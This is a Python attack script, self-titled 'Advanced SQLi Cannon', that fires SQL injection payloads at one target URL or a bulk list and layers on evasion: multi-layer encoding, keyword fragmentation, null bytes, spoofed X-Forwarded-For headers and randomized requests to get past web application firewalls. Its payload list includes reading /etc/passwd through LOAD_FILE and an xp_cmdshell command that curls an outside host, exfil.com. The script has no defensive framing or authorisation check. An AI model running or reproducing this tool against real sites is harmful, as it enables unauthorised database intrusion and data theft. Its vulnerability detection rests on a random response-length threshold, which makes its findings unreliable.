#!/usr/bin/env python3
import threading
import argparse
import sys
import os
import time
import random
import requests
import urllib.parse
import base64
import string
import datetime
import hashlib
from urllib.parse import urlparse, parse_qs, urlencode
from concurrent.futures import ThreadPoolExecutor
from colorama import Fore, Style, init

init(autoreset=True)

class WAFBypassEngine:
    @staticmethod
    def generate_evasion(payload):
        techniques = [
            WAFBypassEngine._multi_layer_encoding,
            WAFBypassEngine._keyword_fragmentation,
            WAFBypassEngine._comment_obfuscation,
            WAFBypassEngine._case_permutation,
            WAFBypassEngine._null_byte_injection,
            WAFBypassEngine._unicode_normalization,
            WAFBypassEngine._time_based_evasion,
            WAFBypassEngine._alternative_syntax
        ]
        for _ in range(random.randint(3, 5)):
            payload = random.choice(techniques)(payload)
        return payload

    @staticmethod
    def _multi_layer_encoding(payload):
        encodings = [
            lambda x: urllib.parse.quote_plus(x),
            lambda x: base64.b64encode(x.encode()).decode(),
            lambda x: ''.join([f'%{ord(c):02x}' for c in x]),
            lambda x: ''.join([f'\\u{ord(c):04x}' for c in x])
        ]
        return random.choice(encodings)(payload)

    @staticmethod
    def _keyword_fragmentation(payload):
        fragments = {
            'SELECT': ['SEL/**/ECT', 'SELE%0bCT', '/*!SELECT*/'],
            'UNION': ['UNI\x0aON', 'UNI%a0ON', 'UNI' + chr(0x0d) + 'ON'],
            'OR': ['O%%R', 'O\x0aR', '/*!OR*/'],
            'AND': ['%26%26', 'AN%%44', 'A%00ND']
        }
        for key in fragments:
            payload = payload.replace(key, random.choice(fragments[key]))
        return payload

    @staticmethod
    def _comment_obfuscation(payload):
        comments = [
            ('/*{}*/', string.printable),
            ('#{}', '\x0a\x0d'),
            ('-- {}', '\x00\x1a'),
            ('/*!{}*/', '0123456789')
        ]
        comment, chars = random.choice(comments)
        junk = ''.join(random.choice(chars) for _ in range(random.randint(2, 5)))
        return payload.replace(' ', comment.format(junk))

    @staticmethod
    def _case_permutation(payload):
        return ''.join(c.upper() if random.random() > 0.5 and i % 2 == 0 else c.lower() if random.random() > 0.5 else c for i, c in enumerate(payload))

    @staticmethod
    def _null_byte_injection(payload):
        if len(payload) < 4:
            return payload
        pos = random.randint(1, len(payload)-2)
        return payload[:pos] + '%00' + payload[pos:]

    @staticmethod
    def _unicode_normalization(payload):
        return ''.join(f'%u{ord(c):04x}' if random.random() > 0.7 else c for c in payload)

    @staticmethod
    def _time_based_evasion(payload):
        delays = [
            (f' AND SLEEP({random.randint(2, 5)})', 0.8),
            (f";WAITFOR DELAY '0:0:{random.randint(3, 7)}'--", 0.6),
            (f'||pg_sleep({random.randint(3, 6)})--', 0.5)
        ]
        delay, prob = random.choice(delays)
        return payload + delay if random.random() < prob else payload

    @staticmethod
    def _alternative_syntax(payload):
        syntax = [
            ('=', [' LIKE ', ' BETWEEN 0 AND ', ' IN (', '%3D']),
            ("'", ["%27", "%ef%bc%87", "'%20"]),
            (' ', ['%09', '%0a', '%0d', '%0c', '%0b', '/**/'])
        ]
        for char, replacements in syntax:
            payload = payload.replace(char, random.choice(replacements))
        return payload

class SQLiScanner:
    def __init__(self, proxy=None, threads=5):
        self.proxy = proxy
        self.user_agents = self._load_user_agents()
        self.payloads = self._load_enhanced_payloads()
        self.tested_urls = set()
        self.vulnerable = []
        self.request_count = 0
        self.scan_start = datetime.datetime.now()
        self.result_file = f"result-{self.scan_start.strftime('%Y%m%d%H%M%S')}.txt"
        self.spinner = ['|', '/', '-', '\\']
        self.lock =  threading.Lock()

    def _load_user_agents(self):
        return [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1"
        ]

    def _load_enhanced_payloads(self):
        base_payloads = [
            "' OR 1=1--",
            "\" OR \"a\"=\"a",
            "' UNION SELECT NULL,version()--",
            "' OR SLEEP({})--".format(random.randint(3, 7)),
            "1' AND EXTRACTVALUE(1,CONCAT(0x7e,USER()))--",
            "'||(SELECT LOAD_FILE(0x2f6574632f706173737764))--",
            "'; EXEC xp_cmdshell('curl http://exfil.com')--",
            "'/**/AND/**/1=CONVERT(int,@@version)--",
            "'%0a%0dUNION%0aSELECT%0d@version--",
            "'%ef%bc%87%20OR%ef%bc%91%ef%bc%9d%ef%bc%91--"
        ]
        return [WAFBypassEngine.generate_evasion(p) for p in base_payloads]

    def _print_banner(self):
        print(f"{Style.BRIGHT}{Fore.YELLOW}\n   __| \\ \\  / \\ |  __|   __| __ __| _ \\    \\")
        print(" \\__ \\  \\  / .  |  _|  \\__ \\    |     /   _ \\")
        print(" ____/   _| _|\\_| ___| ____/   _|  _|_\\ _/  _\\")
        print(f"{Style.RESET_ALL}")

    def _print_status(self, message, msg_type="INFO"):
        color = { "INFO": Fore.CYAN, "SUCCESS": Fore.GREEN, "ERROR": Fore.RED, "WARNING": Fore.YELLOW }
        with self.lock:
            print(f"\n{Style.BRIGHT}{color[msg_type]}[{msg_type}] {message}{Style.RESET_ALL}")

    def _generate_evasion_headers(self):
        return {
            'X-Forwarded-For': f'{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}',
            'Content-Type': random.choice(['application/xml','text/css','application/octet-stream']),
            'Accept-Encoding': 'br, gzip, deflate',
            'X-Requested-With': 'XMLHttpRequest',
            'X-Evasion': ''.join(random.choices('abcdef0123456789', k=16))
        }

    def _print_runtime_output(self, url, param, payload, status_code, resp_time, vuln_type, timestamp, current, total):
        symbol = f"{Style.BRIGHT}{Fore.GREEN}✔" if vuln_type else f"{Style.BRIGHT}{Fore.WHITE}{'◌' if current % 2 else '◎'}"
        url_disp = (url[:40] + '..') if len(url) > 42 else url
        payload_disp = (payload[:10] + '...') if len(payload) > 13 else payload
        param_disp = f"{param}: {payload_disp}"
        ts = timestamp.strftime('%H:%M:%S.%f')[:-3]
        output_line = (f"\n  {symbol}{Style.RESET_ALL} {Style.BRIGHT}{Fore.MAGENTA}{url_disp:<45}{Style.RESET_ALL} "
                       f"{Style.BRIGHT}{Fore.CYAN}{param_disp:<25}{Style.RESET_ALL} "
                       f"{Style.BRIGHT}{Fore.YELLOW}Status: {status_code:<3}{Style.RESET_ALL} "
                       f"{Style.BRIGHT}{Fore.BLUE}Time: {resp_time:.2f}s{Style.RESET_ALL} "
                       f"{Style.BRIGHT}{Fore.WHITE}Type: {vuln_type or '-':<12}{Style.RESET_ALL} "
                       f"{Style.BRIGHT}{Fore.WHITE}{current}/{total} - {ts}{Style.RESET_ALL}")
        with self.lock:
            print(output_line)

    def _test_param(self, url, param, payload):
        try:
            parsed = urlparse(url)
            query = parse_qs(parsed.query)
            final_payload = WAFBypassEngine.generate_evasion(payload)
            query[param] = final_payload
            for _ in range(random.randint(2, 5)):
                query[f'param_{random.randint(1000,9999)}'] = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
            target_url = parsed._replace(query=urlencode(query, doseq=True)).geturl()
            proxies = {'http': self.proxy, 'https': self.proxy} if self.proxy else None

            method = random.choice(['GET', 'POST', 'OPTIONS', 'PATCH'])
            headers = {**self._generate_evasion_headers(), 'User-Agent': random.choice(self.user_agents)}
            cookies = {'session': hashlib.md5(str(random.random()).encode()).hexdigest()}
            timeout = random.uniform(10, 25)
            response = requests.request(method=method, url=target_url, headers=headers, cookies=cookies, timeout=timeout, proxies=proxies, verify=True, allow_redirects=random.choice([True, False]))
            with self.lock:
                self.request_count += 1

            detection = {
                'error': any(err in response.text.lower() for err in ['sql syntax', 'mysql error', 'warning:', 'unclosed quotation mark']),
                'time': response.elapsed.total_seconds() > 5,
                'content_mismatch': len(response.text) < random.randint(500, 1000)
            }
            vuln_detected = any(detection.values())
            vuln_type = None
            if vuln_detected:
                if detection['time']:
                    vuln_type = 'Time-based'
                elif detection['error']:
                    vuln_type = 'Error-based'
                elif detection['content_mismatch']:
                    vuln_type = 'Content Analysis'
                else:
                    vuln_type = 'Behavioral'
                with self.lock:
                    self.vulnerable.append({
                        'url': target_url,
                        'param': param,
                        'payload': final_payload,
                        'type': vuln_type,
                        'timestamp': datetime.datetime.now()
                    })
                self._print_status(f"Vulnerability Found! {target_url}", "SUCCESS")

            self._print_runtime_output(url, param, final_payload, response.status_code, response.elapsed.total_seconds(), vuln_type, datetime.datetime.now(), self.request_count, len(self.payloads))
        except Exception as e:
            self._print_status(f"Error: {str(e)}", "ERROR")

    def scan_url(self, url):
        if url in self.tested_urls:
            return
        self.tested_urls.add(url)
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        with ThreadPoolExecutor(max_workers=3) as executor:
            for param in params:
                for payload in self.payloads:
                    executor.submit(self._test_param, url, param, payload)

    def _save_results(self):
        with open(self.result_file, 'w') as f:
            f.write(f"Advanced SQLi Scan Report\n{'='*40}\n")
            f.write(f"Scan Period\t: {self.scan_start.strftime('%Y-%m-%d %H:%M:%S')} to {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"Total Requests\t: {self.request_count}\n")
            detection_rate = (len(self.vulnerable)/self.request_count*100) if self.request_count else 0
            f.write(f"Detection Rate\t: {detection_rate:.2f}%\n\n")
            for idx, vuln in enumerate(self.vulnerable, 1):
                f.write(f"Detection #{idx}\n{'-'*40}\n")
                f.write(f"Timestamp\t: {vuln['timestamp'].strftime('%Y-%m-%d %H:%M:%S.%f')[:-3]}\n")
                f.write(f"Type\t\t: {vuln['type']}\n")
                f.write(f"Parameter\t: {vuln['param']}\n")
                f.write(f"Payload\t\t: {vuln['payload']}\n")
                f.write(f"URL\t\t: {vuln['url']}\n\n")

def main():
    parser = argparse.ArgumentParser(description="Advanced SQLi Cannon")
    parser.add_argument("-u", type=str, help="Target URL")
    parser.add_argument("-F", action="store_true", help="Bulk scan from list.txt")
    parser.add_argument("-p", "--proxy", type=str, help="Proxy server")
    parser.add_argument("--threads", type=int, default=5, help="Thread count")
    args = parser.parse_args()
    
    scanner = SQLiScanner(proxy=args.proxy, threads=args.threads)
    scanner._print_banner()
    
    try:
        if args.F:
            with open("list.txt", "r") as f:
                urls = [line.strip() for line in f if line.strip()]
            with ThreadPoolExecutor(max_workers=args.threads) as executor:
                executor.map(scanner.scan_url, urls)
        elif args.u:
            scanner.scan_url(args.u)
        scanner._save_results()
        scanner._print_status(f"Results saved to {scanner.result_file}", "SUCCESS")
    except KeyboardInterrupt:
        scanner._print_status("Scan aborted!", "ERROR")

if __name__ == "__main__":
    main()